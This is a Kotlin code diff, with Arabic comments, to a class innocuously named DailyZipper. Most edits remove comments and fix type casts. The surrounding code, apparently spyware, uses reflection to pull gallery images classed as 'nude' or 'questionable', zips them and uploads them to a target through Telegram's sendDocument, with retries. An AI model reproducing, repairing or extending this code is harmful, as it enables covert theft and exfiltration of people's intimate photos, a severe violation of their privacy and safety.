@@ -85,7 +85,6 @@ class DailyZipper(
     }
 
     init {
-        // استخدام put بدلاً من [] لتجنب MatchGroupCollection
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
         config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
@@ -99,7 +98,7 @@ class DailyZipper(
 
     @Suppress("UNCHECKED_CAST")
     private fun <T> getConfigValue(key: String, default: T): T {
-        val value = config.get(key)  // استخدام get بدلاً من []
+        val value = config.get(key)
         if (value == null) return default
         return try {
             when (default) {
@@ -135,10 +134,6 @@ class DailyZipper(
         val maxBatches: Int
     )
 
-    // ============================================================
-    //  تحويل القيم إلى Long (للاستدعاءات الانعكاسية)
-    // ============================================================
-
     private fun toLong(value: Any?): Long? {
         return when (value) {
             is Long -> value
@@ -150,10 +145,6 @@ class DailyZipper(
             else -> null
         }
     }
-
-    // ============================================================
-    //  باقي دوال التكوين والملفات
-    // ============================================================
 
     private fun loadConfig() {
         if (!configFile.exists()) {
@@ -168,7 +159,7 @@ class DailyZipper(
                 val key = keys.next()
                 val value = json.opt(key)
                 if (value != null && value != JSONObject.NULL) {
-                    config.put(key, value)  // استخدام put بدلاً من []
+                    config.put(key, value)
                 }
             }
             maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
@@ -313,10 +304,10 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام safeGetBoolean بدلاً من fetchBoolean
+                // ✅ تحويل صريح إلى Map<Any?, Any?> ثم استخدام safeGetBoolean
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> result.safeGetBoolean("ok")
+                    is Map<*, *> -> (result as Map<Any?, Any?>).safeGetBoolean("ok")
                     else -> false
                 }
                 if (success) {
@@ -645,8 +636,11 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام safeGetString بدلاً من fetchString
-                            val path = item.safeGetString("path")
+                            // ✅ تحويل صريح إلى Map<Any?, Any?> ثم استخدام safeGetString
+                            val path = when (item) {
+                                is Map<*, *> -> (item as Map<Any?, Any?>).safeGetString("path")
+                                else -> ""
+                            }
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
@@ -709,7 +703,7 @@ class DailyZipper(
         }
 
         val result = HashMap<String, Any>()
-        result.put("pending", count)   // استخدام put بدلاً من []
+        result.put("pending", count)
         result.put("size", totalSize)
         return result
     }
